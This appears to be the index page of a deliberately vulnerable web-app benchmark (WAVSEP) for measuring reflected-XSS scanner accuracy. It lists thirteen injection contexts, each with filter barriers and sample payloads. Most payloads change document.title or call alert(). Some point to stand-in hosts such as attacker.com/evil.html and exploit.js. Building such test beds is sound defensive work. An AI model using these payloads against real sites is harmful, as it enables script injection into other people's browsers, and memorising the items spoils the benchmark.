<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of Reflected XSS Detection Accuracy - HTTP GET Method</title>
</head>
<body>
<font size="5">Test Cases:</font><br><br>
<B><a href="Case01-Tag2HtmlAttributeNameScope.jsp?userinput=textvalue">Case01-Tag2HtmlAttributeNameScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML attribute name.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  [dhtmlevent]=&quot;[JavaScript Code]&quot;<br>
  &gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: onerror=&quot;document&#46;title&#61;'Exploit'&#59;&quot;<br>
  Silent Exploit: onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;<br>
  <br>
<B><a href="Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp?userinput=textvalue">Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML attribute quoteless value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  [exploit code];<br>
  &gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: document&#46;title&#61;'Exploit'&#59;<br>
  Exploit: &gt;&#60;script&#62;document&#46;title&#61;'Exploit'&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: document&#46;title=document&#46;domain&#59;<br>
  <br>
<B><a href="Case03-Tag2HtmlURLAttributeValueQuotelessScope.jsp?userinput=textvalue">Case03-Tag2HtmlURLAttributeValueQuotelessScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML URL attribute quoteless value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  javascript:[JavaScript Code];<br>
   &gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  http://attacker.com/evil.html<br>
  <U>Examples:</U><br>
  Exploit: javascript:document&#46;title&#61;'Exploit'&#59;<br>
  Silent Exploit: javascript:document&#46;title=document&#46;domain&#59;<br>
  LFI: exploit.html<br>
  RFI: http://attacker.com/evil.html<br>
  <br>
<B><a href="Case04-Tag2HtmlAttributeValueSingleQuoteScope.jsp?userinput=textvalue">Case04-Tag2HtmlAttributeValueSingleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML attribute singlequote value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  value' src='http://attacker.com/exploit.js<br>
  value'&gt;&lt;/script&gt;;&lt;script&gt;[code];//<br>
  <U>Examples:</U><br>
  Exploit: none' src='http://localhost:8080/wavsep/WebContent/active/Reflected-XSS/RXSS-New-Contexts/exploit.js<br>
  Exploit: value'&gt;&lt;/script&gt;&lt;script&gt;alert(1);//<br>
  <br>
<B><a href="Case05-Tag2HtmlAttributeValueSingleQuoteScope.jsp?userinput=textvalue">Case05-Tag2HtmlAttributeValueSingleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML attribute singlequote value.<br>
  <U>Barriers:</U><br>
  'http:' string is stripped from the input<br>
  Script tags are stripped from the input<br>
  &gt; characters are stripped from the input<br>
  <U>Sample Exploit Structures:</U><br>
  value' src='notworkingURL' onerror='[code]<br>
  <U>Examples:</U><br>
  Exploit: qwerty' src='a' onerror='alert()<br>
  Silent Exploit: a' src='a' onerror='document&#46;title=document&#46;domain&#59;<br>
  <br>
<B><a href="Case06-Tag2HtmlMetaAttributeValueDoubleQuoteScope.jsp?userinput=textvalue">Case06-Tag2HtmlMetaAttributeValueDoubleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML meta attribute doublequote value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  value;http://attacker.com/exploit.html"HTTP-EQUIV="refresh"<br>
  "&gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: 0;http://localhost:8080/wavsep/WebContent/active/Reflected-XSS/RXSS-New-Contexts/exploit.html"HTTP-EQUIV="refresh"<br>
  Silent Exploit: &quot;&gt;&lt;script&gt;document&#46;title=document&#46;domain&lt;/script&gt;<br>
  Safari Exploit: 0;url=javascript:alert(1)"HTTP-EQUIV="refresh"<br>
  <br>
<B><a href="Case07-Tag2HtmlMetaAttributeValueSingleQuoteScope.jsp?userinput=textvalue">Case07-Tag2HtmlMetaAttributeValueSingleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML meta attribute singlequote value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  value;http://attacker.com/exploit.html'HTTP-EQUIV='refresh'<br>
  '&gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: 0;http://localhost:8080/wavsep/WebContent/active/Reflected-XSS/RXSS-New-Contexts/exploit.html'HTTP-EQUIV='refresh'<br>
  Silent Exploit: '&gt;&lt;script&gt;document&#46;title=document&#46;domain&lt;/script&gt;<br>
  Safari Exploit: 0;url=javascript:alert(1)'HTTP-EQUIV='refresh'<br>
  <br>
<B><a href="Case08-Tag2HtmlMetaAttributeValueQuotelessScope.jsp?userinput=textvalue">Case08-Tag2HtmlMetaAttributeValueQuotelessScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML meta attribute quoteless value.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  value;http://attacker.com/exploit.html HTTP-EQUIV=refresh<br>
  &gt;&lt;script&gt;[JavaScript Code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: 0;http://localhost:8080/wavsep/WebContent/active/Reflected-XSS/RXSS-New-Contexts/exploit.html HTTP-EQUIV=refresh<br>
  Silent Exploit:  &gt;&lt;script&gt;document&#46;title=document&#46;domain&lt;/script&gt;<br>
  Safari Exploit: 0;url=javascript:alert(1) HTTP-EQUIV=refresh<br>
  <br>
<B><a href="Case09-Tag2HtmlJavaScriptCodeScope.jsp?userinput=textvalue">Case09-Tag2HtmlJavaScriptCodeScope.jsp</a></B><br>
  Injection of tags to the scope of the Javascript code.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  [JavaScript Code]<br>
  [JavaScript Code]==1<br>
  <U>Examples:</U><br>
  Exploit: alert('XSS')==1<br>
  Silent Exploit:  document&#46;title=document&#46;domain<br>
  <br>
<B><a href="Case10-Tag2HtmlJavaScriptCodeDoubleQuoteScope.jsp?userinput=textvalue">Case10-Tag2HtmlJavaScriptCodeDoubleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the Javascript code with double quote context.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  ");[JavaScript Code];//<br>
  <U>Examples:</U><br>
  Exploit: ");alert('XSS');//<br>
  Silent Exploit: ");document&#46;title=document&#46;domain;//<br>
  <br>
<B><a href="Case11-Tag2HtmlJavaScriptCodeSingleQuoteScope.jsp?userinput=textvalue">Case11-Tag2HtmlJavaScriptCodeSingleQuoteScope.jsp</a></B><br>
  Injection of tags to the scope of the Javascript code with single quote context.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  ');[JavaScript Code];//<br>
  <U>Examples:</U><br>
  Exploit: ');alert('XSS');//<br>
  Silent Exploit: ');document&#46;title=document&#46;domain;//<br>
  <br>
<B><a href="Case12-Tag2CSSQuotedStringScope.jsp?userinput=textvalue">Case12-Tag2CSSQuotedStringScope.jsp</a></B><br>
  Injection of tags to the scope of the CSS quoted string.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  ";}&lt;/style&gt;&lt;script&gt;[JavaScript code]&lt;/script&gt;<br>
  ";&lt;/style&gt;&lt;script&gt;[JavaScript code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: ";&lt;/style&gt;&lt;script&gt;document.title='Exploit'&lt;/script&gt;<br>
  Silent Exploit: ";}&lt;/style&gt;&lt;img src=a onerror=document.title=document.domain&gt;<br>
  <br>
<B><a href="Case13-Tag2CSSCommentScope.jsp?userinput=textvalue">Case13-Tag2CSSCommentScope.jsp</a></B><br>
  Injection of tags to the scope of the CSS comment.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  */&lt;/style&gt;&lt;script&gt;[JavaScript code]&lt;/script&gt;<br>
  <U>Examples:</U><br>
  Exploit: */&lt;/style&gt;&lt;script&gt;document.title='Exploit'&lt;/script&gt;<br>
  Silent Exploit: */&lt;/style&gt;&lt;img src=a onerror=document.title=document.domain&gt;<br>
  <br>

<br><br>

</body>
</html>

<!--
<U>Sample Exploit Structures:</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
-->
